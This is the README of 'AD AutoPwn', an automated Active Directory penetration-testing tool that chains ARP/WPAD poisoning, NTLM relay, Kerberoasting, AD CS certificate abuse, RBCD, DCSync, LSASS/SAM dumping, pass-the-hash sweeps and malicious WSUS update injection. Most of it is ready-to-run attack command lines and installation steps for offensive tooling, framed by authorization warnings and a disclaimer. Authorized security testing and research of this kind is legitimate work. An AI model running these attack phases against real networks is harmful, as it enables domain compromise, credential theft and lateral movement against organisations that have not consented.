# AD AutoPwn

![Made with Python](https://img.shields.io/badge/made%20with-Python-3776AB?logo=python&logoColor=white)
![AD AutoPwn](https://img.shields.io/badge/AD-AutoPwn-black)
![Authorized Testing Only](https://img.shields.io/badge/use-authorized%20testing%20only-red)
![Version](https://img.shields.io/badge/version-4.13.0-blue)

**Zero-Auth to Domain Admin — Automated Active Directory Attack Chain**

A fully automated penetration testing tool that chains 25+ attack
techniques to compromise Active Directory environments. Designed for
authorized security assessments.

```
    _    ____       _         _        ____
   / \  |  _ \     / \  _   _| |_ ___ |  _ \__      ___ __
  / _ \ | | | |   / _ \| | | | __/ _ \| |_) \ \ /\ / / '_ \
 / ___ \| |_| |  / ___ \ |_| | || (_) |  __/ \ V  V /| | | |
/_/   \_\____/  /_/   \_\__,_|\__\___/|_|     \_/\_/ |_| |_|

    ⚡ Zero-Auth to Domain Admin — Attack Chain
    Discover | Sniff | ARP | WPAD | WSUS | PXE | AD CS | SCCM | Roast
    gMSA | NetNTLMv1 | BloodHound | Reflect | Loot | RBCD+KCD | DCSync | DPAPI
```

## Features

### Pre-auth username & credential discovery (zero creds)
- **kerbrute** KRB-AS-REQ user enumeration (lockout-safe)
- **CLDAP NetLogon ping** username enumeration (lockout-safe)
- **AS-REP roast** of all candidates (free hashes for accounts with `DONT_REQ_PREAUTH`)
- **pre2k auto-test** (Windows 2000 compatibility default-password machines)
- **Single-password spray** (lockout-aware, opt-in via `--spray-password`)

### Layer-2 / passive zero-auth attacks
- **Passive network sniffing** — WPAD, WSUS, PXE, LLMNR, DHCPv6, TFTP, SCCM ProxyDHCP detection
- **ARP spoof + NTLM relay** — capture and crack NTLMv2 hashes
- **WPAD poisoning** — mitm6 / Responder IPv6 DNS hijack
- **WSUS relay** — intercept Windows Update NTLM auth (port 8530/8531)
- **PXE boot credential theft** — extract creds from boot images via TFTP/WIM
- **NTLM theft file drops** — `.library-ms` / `.theme` / `.url` files on writable shares
- **WebDAV coercion** — WebClient HTTP → LDAP relay (bypasses SMB signing)
- **DHCP coercion** — DHCP server machine account relay

### Authentication-reflection bypass (Synacktiv 2026)
- **CVE-2025-58726 ghost-SPN** Kerberos AP-REQ reflection (auto-fired by BloodHound auto-action)
- **CVE-2026-24294 LPE** — SMB-on-arbitrary-tcpport reflection (Win11 24H2 / Server 2025 pre-March-2026)
- **CVE-2026-26128 LPE** — Kerberos loopback via Unicode SPN
- **Unicode-SPN fallback** when CVE-2025-33073 path is patched

### Credential harvesting (post-auth)
- **Kerberoasting** — extract and auto-crack SPN hashes (hashcat mode 13100/19700)
- **AS-REP Roasting** — crack accounts without pre-auth (hashcat mode 18200)
- **Timeroast** — SNTP-MS hashes from any domain-joined machine (hashcat mode 31300)
- **gMSA managed-password read** — `nxc -M gmsa` in the enrichment battery turns
  a readable Group Managed Service Account's `msDS-ManagedPassword` blob directly
  into a pass-the-hash-able NT hash; `ReadGMSAPassword` ACEs are auto-fired as a
  BloodHound auto-action edge
- **LAPS password recovery** + **userPassword LDAP attribute** + **description-leaked passwords** (mined from nxc enrichment battery)
- **SCCM NAA theft** — extract Network Access Account credentials via sccmhunter
- **NetNTLMv1 downgrade → machine NT hash** — coerce a host to a static-challenge
  Responder (ESS disabled), capture the NetNTLMv1 response, recover the machine
  account's NT hash via crack.sh's DES keyspace. Signing-independent (works where
  the NTLMv2 relay can't): DC$ → straight DCSync; member$ → S4U2Self self-takeover
  → local admin

### Graph-driven attack chains (BloodHound)
- **`bloodhound-python -c All`** collection + ZIP analysis
- **High-value findings** — Domain/Enterprise/Schema Admins, Kerberoastable, AS-REP roastable, unconstrained delegation, RBCD inbound, LAPS, AdminCount
- **Actionable-edge analysis** — controlled-principal closure (you + transitive group memberships) → ACE edges where you are the principal: `WriteSPN`, `AddKeyCredentialLink`, `GenericAll/Write`, `WriteDacl/Owner`, `WriteAccountRestrictions`, `AddAllowedToAct`, `ForceChangePassword`
- **AdminTo extraction** — computers where a principal you control sits in the
  local Administrators group; written to `admin-to-hosts.txt` and fed straight
  into the loot phase as SAM/LSA dump targets
- **Auto-action chain** — automatically fires matching primitives:
  - `WriteSPN → ghost-SPN upgrade` (CVE-2025-58726)
  - `AddKeyCredentialLink → shadow credentials → PKINIT → NT hash`
  - `ReadGMSAPassword → gMSA managed-password read → NT hash`
  - `GenericAll / WriteAccountRestrictions on Computer → RBCD chain → admin TGS`

### Privilege escalation primitives
- **AD CS exploitation** — ESC1-ESC16 via certipy (auto-enum + exploit)
  - ESC8 (web-enrollment relay)
  - ESC9/ESC10 UPN-swap (CVE-2022-26923 bypass)
  - ESC4 template modify+exploit+restore (cwd-safe)
  - **ESC1-CMC** — KB5014754 bypass via CMC `id-cmc-addExtensions` (bundled
    `cmc_addext.py`). When a patched CA issues an ESC1 cert but PKINIT binds to
    the requester, ad-autopwn falls back to forging an Administrator cert with a
    **matching `szOID_NTDS_CA_SECURITY_EXT` SID** — so PKINIT wins even at
    `StrongCertificateBindingEnforcement=2`. The only path here that beats full
    enforcement, and (unlike ESC9/ESC10) needs no controllable victim account.
  - Certihound enumeration with certipy fallback (NT-hash auth)
- **Shadow Credentials** — msDS-KeyCredentialLink via ntlmrelayx or pywhisker
- **RBCD abuse** — Resource-Based Constrained Delegation (addcomputer + S4U2Self + S4U2Proxy)
- **RBCD+KCD chain orchestrator** — full WriteSPN → ghost-SPN → RBCD → S4U2Proxy → `-altservice` rewrite, in one phase
- **TGS sname rewrite** (tgssub-style KCD protocol-transition bypass) — standalone or inline via `-altservice`
- **Dollar Ticket** — KDC's automatic `$`-suffix retry on principal lookup → TGT for Linux user via auto-created `<user>$` machine account → GSSAPI SSH
- **GPO abuse** — pyGPOAbuse scheduled task as SYSTEM

### Domain compromise
- **DCSync** — full domain hash dump via impacket-secretsdump
- **DPAPI backup key** — extract domain DPAPI key for offline credential decryption
- **AppLocker bypass** — LOLBins (mshta, certutil, regsvr32, etc.) + WSUS signed delivery
- **WSUS update injection** — push malicious Windows Updates via wsuks

### Post-exploitation loot
- **Local SAM / LSA / LSASS dump** — on every host where you hold local admin
  (compromised, AdminTo, or PtH-reuse hosts), run `nxc --sam --lsa` (+ optional
  `lsassy`) to harvest local NT hashes, cached domain creds (`$DCC2$`), service
  account secrets and DPAPI keys. Turns one foothold into many.
- **Pass-the-hash reuse sweep** — takes each harvested local `Administrator` NT
  hash and sprays it `--local-auth` across the subnet to find hosts sharing the
  local password; newly-pwned hosts feed back into the loot loop
- **Process command-line harvest** — `Get-CimInstance Win32_Process` via `nxc -x`; regex-greps for passwords in mysql/sqlcmd/runas/KeePass/`--password` style flags
- **KeePass vault discovery + crack** — find `*.kdbx` in `C:\Users`, download via smbclient, `keepass2john | hashcat -m 13400`

## Usage

Every live run displays a production-use warning and requires interactive
confirmation that you have written permission and an agreed scope. Approved
non-interactive automation can bypass the prompt with `--acknowledge-risk`.
The warning is still displayed.

```bash
# Fully automated — zero-cred chain (prompts for authorization)
sudo ./ad-autopwn.py

# Approved non-interactive/lab automation
sudo ./ad-autopwn.py --acknowledge-risk

# With credentials — full chain
./ad-autopwn.py -u jsmith -p 'P@ss123' -d corp.local --dc-ip 10.0.0.1

# AWS / VPC labs (Layer 2 attacks blocked) — auto-discovery still works
sudo ./ad-autopwn.py --no-arp --no-wpad

# Pre-auth credential discovery (lockout-safe)
sudo ./ad-autopwn.py --phase discover --no-arp --no-wpad

# BloodHound graph collection + automatic high-value analysis
./ad-autopwn.py --phase bloodhound -u user -p pass -d corp.local \
                --dc-ip 10.0.0.1 --dc-fqdn dc01.corp.local

# Dollar Ticket — TGT for 'root' via auto-created root$ machine acct
./ad-autopwn.py -u user -p pass -d corp.local --dc-ip 10.0.0.1 \
                --phase dollar-ticket --target-user root

# RBCD+KCD chain — full ghost-SPN + RBCD + altservice rewrite, one shot
./ad-autopwn.py -u user -p pass -d corp.local --dc-ip 10.0.0.1 \
                --phase rbcd-kcd -T VHAGAR$ --alt-spn HTTP/vhagar.corp.local

# gMSA managed-password read → NT hash
./ad-autopwn.py -u user -p pass -d corp.local --dc-ip 10.0.0.1 \
                --phase gmsa -T 'svc_gmsa$'

# NetNTLMv1 downgrade — coerce the DC, capture NetNTLMv1, format for crack.sh
sudo ./ad-autopwn.py -u user -p pass -d corp.local --dc-ip 10.0.0.1 \
                -a 10.0.0.50 -i eth0 --phase ntlmv1 -T 10.0.0.1

# NetNTLMv1 fast-path — chain a crack.sh-recovered DC hash straight to DCSync
./ad-autopwn.py -u user -p pass -d corp.local --dc-ip 10.0.0.1 \
                --dc-fqdn dc01.corp.local --phase ntlmv1 \
                --ntlmv1-nthash 'DC01$:e19ccf75ee54e06b06a5907af13cef42'

# Loot — local SAM/LSA/LSASS dump + pass-the-hash reuse sweep
./ad-autopwn.py -u user -p pass -d corp.local --dc-ip 10.0.0.1 \
                -t 10.0.0.0/24 --phase loot

# AppLocker bypass
./ad-autopwn.py -u user -p pass --applocker --lolbin mshta --custom-cmd "whoami"

# Dry run (print every command, run nothing — even background processes)
./ad-autopwn.py --dry-run -u user -p pass -d corp.local --dc-ip 10.0.0.1
```

## Available phases

| Phase             | Auth   | Description |
|-------------------|--------|-------------|
| `full`            | optional | Complete automated chain (auto-detects with or without creds) |
| `sniff`           | none   | Passive L2 traffic discovery |
| `discover`        | none   | kerbrute + CLDAP + AS-REP + pre2k + (opt-in) spray |
| `arp`             | none   | ARP spoof + NTLM capture |
| `wpad`            | none   | WPAD/LLMNR poisoning (mitm6 / Responder) |
| `wsus`            | none   | WSUS NTLM relay |
| `pxe`             | none   | PXE boot credential theft |
| `enum`            | yes    | Target enumeration (relay targets, unconstrained delegation, WebClient hosts) |
| `enrich`          | yes    | nxc 14-module battery (gMSA, LAPS, timeroast, MAQ, nopac, zerologon, …) + auto-consumer |
| `gmsa`            | yes    | Read a gMSA's managed password → NT hash (`-T <gmsa_account>`) |
| `bloodhound`      | yes    | `bloodhound-python -c All` + analysis (incl. AdminTo) + auto-action chains |
| `roast`           | yes    | Kerberoast + AS-REP Roast |
| `adcs`            | yes    | AD CS exploitation (ESC1-ESC16 + ESC1-CMC KB5014754 bypass) |
| `sccm`            | yes    | SCCM NAA credential theft |
| `exploit`         | yes    | NTLM reflection / coercion exploit on a specific target |
| `ntlmv1`          | yes¹   | NetNTLMv1 downgrade → machine NT hash → DCSync / self-takeover |
| `dcsync`          | yes (DA) | Domain hash dump |
| `loot`            | yes    | Local SAM/LSA/LSASS dump + PtH reuse + cmdline harvest + KeePass |
| `tgs-rewrite`     | none   | Offline ccache sname rewrite (tgssub-style KCD bypass) |
| `dollar-ticket`   | yes    | KDC `$`-suffix retry attack (Linux GSSAPI target) |
| `rbcd-kcd`        | yes    | Full RBCD+KCD chain orchestrator (WriteSPN → ghost → RBCD → S4U+altservice) |
| `reflect-tcpport` | yes    | CVE-2026-24294 LPE primitive (SMB-on-tcpport) |
| `reflect-loopback`| yes    | CVE-2026-26128 LPE primitive (Kerberos loopback via Unicode SPN) |
| `kerb-reflect`    | yes    | CVE-2025-58726 ghost-SPN AP-REQ reflection |

¹ `ntlmv1` live capture needs **root** (Responder) + a listener IP (`-a`) and
creds to drive coercion. The `--ntlmv1-nthash 'ACCOUNT$:<nthash>'` fast-path
(chaining a hash you already recovered from crack.sh) needs neither root nor a
listener. In `full`/full-auto the downgrade fires automatically when root + a
listener are available (opt out with `--no-ntlmv1`).

## Dependencies

### Python (this repo)

`ad-autopwn.py` itself is pure standard library. The bundled companion tools
(`cmc_addext.py`, `userenum-cldap.py`) need a few packages — install them with:

```bash
pip install -r requirements.txt   # add --break-system-packages on Kali
```

On Kali most of these already ship via `impacket-scripts` / `certipy-ad`.

### APT (Kali Linux)

```bash
apt install python3 impacket-scripts netexec nmap hashcat tcpdump \
  responder dsniff arp-scan certipy-ad bloodyad bloodhound.py \
  smbclient atftp wimtools john seclists
```

### Git repositories (clone to `/opt/tools/`)

```bash
git clone https://github.com/mverschu/CVE-2025-33073        /opt/tools/CVE-2025-33073
git clone https://github.com/dirkjanm/krbrelayx              /opt/tools/krbrelayx
git clone https://github.com/Wh04m1001/DFSCoerce             /opt/tools/DFSCoerce
git clone https://github.com/ShutdownRepo/ShadowCoerce       /opt/tools/ShadowCoerce
git clone https://github.com/ShutdownRepo/pywhisker          /opt/tools/pywhisker
git clone https://github.com/dirkjanm/PKINITtools            /opt/tools/PKINITtools
git clone https://github.com/csandker/pxethiefy              /opt/tools/pxethiefy
git clone https://github.com/garrettfoster13/sccmhunter      /opt/tools/sccmhunter
git clone https://github.com/dirkjanm/mitm6                  /opt/tools/mitm6
git clone https://github.com/Hackndo/pyGPOAbuse              /opt/tools/pyGPOAbuse
git clone https://github.com/Hackndo/WebclientServiceScanner /opt/tools/WebclientServiceScanner
git clone https://github.com/almandin/Certihound             /opt/tools/Certihound
```

### Pipx packages

```bash
pipx install coercer
pipx install wsuks --system-site-packages
```

### Other binaries

- `kerbrute` — grab the latest binary from
  <https://github.com/ropnop/kerbrute/releases> — install to `/usr/local/bin/`
- `userenum-cldap` — companion CLDAP NetLogon-ping enumerator (lives in
  this repo as `userenum-cldap.py`; install to `/usr/local/bin/userenum-cldap`)
- `asn1tools` — `pip install asn1tools` (CLDAP enum runtime dep)
- `ntlmv1-multi` — optional, for `--phase ntlmv1`: converts a captured
  NetNTLMv1 hash to the crack.sh `NTHASH:` / hashcat-14000 format. Clone
  <https://github.com/evilmog/ntlmv1-multi> to `/opt/tools/ntlmv1-multi`.
  Without it, ad-autopwn still saves the raw hash + crack.sh instructions.
- `Responder` needs `aioquic` (`pip install aioquic`) and generated TLS certs
  (`certs/gen-self-signed-cert.sh`) to actually capture — required for WPAD/LLMNR
  and the `ntlmv1` downgrade. Kali's apt `responder` handles both; a git-cloned
  Responder does not.
- `cmc_addext.py` — **ESC1-CMC** engine, ships in this repo. Auto-discovered
  when it sits next to `ad-autopwn.py`, or at `/opt/tools/cmc-addext/`. Third-party
  tool by Mohamed Alzhrani (@0xmaz) — see [Author](#author). Needs
  `impacket`, `cryptography`, `ldap3`, `requests` (see `requirements.txt`).

### Quick install (all deps on Kali)

```bash
# APT packages
sudo apt install python3 impacket-scripts netexec nmap hashcat tcpdump \
  responder dsniff arp-scan certipy-ad bloodyad bloodhound.py \
  smbclient atftp wimtools john seclists

# All required repos
for repo in mverschu/CVE-2025-33073 dirkjanm/krbrelayx \
            Wh04m1001/DFSCoerce ShutdownRepo/ShadowCoerce \
            ShutdownRepo/pywhisker dirkjanm/PKINITtools \
            csandker/pxethiefy garrettfoster13/sccmhunter \
            dirkjanm/mitm6 Hackndo/pyGPOAbuse \
            Hackndo/WebclientServiceScanner almandin/Certihound; do
  sudo git clone "https://github.com/$repo" "/opt/tools/$(basename $repo)"
done

# Python deps for repos that need them
for repo in pywhisker PKINITtools sccmhunter pxethiefy mitm6 pyGPOAbuse Certihound; do
  [ -f "/opt/tools/$repo/requirements.txt" ] && \
    pip3 install --break-system-packages -r "/opt/tools/$repo/requirements.txt"
done

# Pipx packages
pipx install coercer
pipx install wsuks --system-site-packages

# kerbrute (ropnop) binary
sudo wget -q -O /usr/local/bin/kerbrute \
  https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
sudo chmod +x /usr/local/bin/kerbrute

# CLDAP userenum runtime dep
sudo pip3 install --break-system-packages asn1tools

# userenum-cldap companion script (this repo)
sudo wget -q -O /usr/local/bin/userenum-cldap \
  https://raw.githubusercontent.com/jonaslejon/ad-autopwn/main/userenum-cldap.py
sudo chmod +x /usr/local/bin/userenum-cldap

# ad-autopwn itself
sudo cp ad-autopwn.py /usr/local/bin/ad-autopwn
sudo chmod +x /usr/local/bin/ad-autopwn
```

`check_prerequisites()` runs at the top of every invocation and prints
a green ✅ / yellow ⚠️ status for every tool the script touches, with
install hints for anything missing.

## Tested against

- **GOAD-Light** (Game of Active Directory, Orange Cyberdefense)
  on AWS `eu-west-1` — v4.12.0 phase coverage verified
  end-to-end. Auto-discovery on AWS now works with literally just
  `--no-arp --no-wpad` (everything else — interface, attacker IP,
  domain, DC IP, DC FQDN — is auto-detected via subnet sweep + dig
  fallback to `@<dc_ip>`).
- BloodHound auto-action chain proven against the canonical
  `stannis.baratheon → GenericAll → KINGSLANDING$` edge: from a single
  low-priv credential to admin TGS on the DC in 5 seconds.
- DCSync extracted 20 credentials including `krbtgt` — golden ticket viable.
- **v4.12.0 loot** proven end-to-end: local SAM/LSA dump on `castelblack`
  → pass-the-hash reuse sweep pivoted with the RID-500 hash (`goadmin`) →
  `Pwn3d!`. The PtH sweep keys on **RID 500**, not the account name, since
  the built-in admin is commonly renamed.
- **v4.12.0 NetNTLMv1** coercion + static-challenge downgrade validated at
  the packet level against `winterfell` (nxc `coerce_plus`); the DC returns
  a NetNTLMv1 response to the `1122334455667788` challenge as expected.
- **On-prem Layer-2 live-fire** (GOAD-Light + a domain workstation, attacker on
  the same L2 segment — the paths an AWS VPC cannot exercise):
  - `arp` — full **capture → NTLM relay → SAM dump**. A workstation's SMB
    authentication was relayed to a member server with SMB signing disabled and
    its local SAM was dumped. DCs enforce signing and are correctly rejected as
    relay targets, so a signing-disabled member is the viable target.
  - `sniff` — live passive detection of LLMNR queries (multiple hosts), DHCPv6
    solicitations (mitm6-viable) and PXE-boot traffic.

## Needs more testing

The Layer-2 paths below now have **partial on-prem validation** (see "Tested
against"): `arp` and `sniff` have been run live end-to-end. The rest launch and
poison/scan correctly but have **not** produced a live capture — each needs
something the test lab did not provide: a triggering victim, or the target
service itself. (On AWS these could not be tested at all — Layer 2 is blocked
there, which is why the AWS quick-start passes `--no-arp --no-wpad`.)

- **WPAD / LLMNR / NBT-NS poisoning** (`wpad`, mitm6 / Responder IPv6 DNS
  hijack) — poisoning + relay come up correctly, but no NTLM was captured: an
  idle client at the login screen does not request WPAD. Needs an interactive
  user session (logon / browsing / Windows Update) on the victim.
- **WSUS relay** (`wsus`) — the 8530/8531 scan runs and degrades cleanly when
  absent; needs a real WSUS server and a client doing Windows Update NTLM auth.
- **PXE boot credential theft** (`pxe`) — detection now confirms a real TFTP
  server with an active RRQ probe before acting (a false-positive + per-file
  hang on ordinary hosts was fixed); needs a real PXE/OSD distribution point to
  steal from.
- **SCCM NAA credential theft** (`sccm`) — needs a real SCCM site + management point.
- **WebDAV coercion → LDAP relay** — WebClient-triggered HTTP → LDAP relay
  (the SMB-signing bypass path).
- **DHCP coercion** — DHCP-server machine-account relay.
- **NetNTLMv1 full round-trip** (`ntlmv1`) — coercion + static-challenge
  downgrade is validated at the packet level, but the live Responder capture →
  crack.sh recovery → DCSync / self-takeover chain has **not** been run
  end-to-end. Only the `--ntlmv1-nthash` fast-path (feeding an already-recovered
  hash, skipping capture) is proven.

Contributions of capture/PCAP evidence or lab writeups for any of the above are
welcome — open an issue or PR.

## Safety

- Live runs require a `y/N` confirmation that the operator has explicit written
  permission and that the targets and techniques are within the agreed scope.
  `--acknowledge-risk` bypasses the interactive prompt for approved automation;
  it does not suppress the production-use warning.
- `--dry-run` prints every command (foreground **and** background) without
  executing and skips the confirmation prompt — it won't spawn ARP spoofers,
  mitm6, Responder, or ntlmrelayx.
- ESC4 template modifications are wrapped in `try/finally` with `os.chdir`
  to ensure restore lands in the right directory on any exit path.
- AD CS / RBCD / ghost-SPN chains attempt cleanup of planted records on
  completion (DNS records, Trusted-For-Delegation UAC bits, ghost SPNs).
  Machine accounts you create stay in AD — see operator notes in the
  run output for cleanup commands.
- `--no-cleanup` keeps everything for forensic review.

## Disclaimer

**For authorized penetration testing and security research only.**

This tool is designed for use by security professionals during
authorized engagements. Unauthorized access to computer systems is
illegal. Always obtain written permission before testing.

## Acknowledgements

Thanks to [AJ Hammond](https://www.linkedin.com/in/aj-hammond/) for the feedback
that prompted the clearer banner and mandatory authorization warning.

## Author

Triop AB — [https://triop.se](https://triop.se)

### Bundled third-party tool

`cmc_addext.py` is authored by **Mohamed Alzhrani (@0xmaz)** and vendored,
unmodified, from [github.com/MazX0p/cmc-addext](https://github.com/MazX0p/cmc-addext).
It implements the KB5014754 `id-cmc-addExtensions` bypass described at
<https://0xmaz.me/posts/certsrv-id-cmc-addExtensions-KB5014754-bypass/>.
All credit for that technique and code goes to the original author.

## License

[MIT](LICENSE) — applies to ad-autopwn's own code (`ad-autopwn.py`, `userenum-cldap.py`).

`cmc_addext.py` is redistributed as-is from its upstream repository, which
publishes no explicit license. Its copyright remains with Mohamed Alzhrani
(@0xmaz); it is included here for convenience under the same "authorized
testing only" terms stated in its file header. If the upstream author requests
removal or sets different terms, we will comply — open an issue.
